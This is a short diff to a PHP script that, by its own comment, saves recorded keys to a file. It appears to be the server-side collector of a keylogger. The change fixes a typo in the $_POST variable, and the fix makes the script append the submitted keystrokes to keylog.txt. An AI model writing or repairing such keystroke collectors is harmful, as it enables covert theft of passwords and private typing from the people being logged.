@@ -6,7 +6,7 @@
     {
         // saves recorded keys to file
         $logfile = fopen('keylog.txt', 'a+');
-        fwrite($logfile, $_POSt['key']);
+        fwrite($logfile, $_POST['key']);
         fclose($logfile);
     }
 ?>
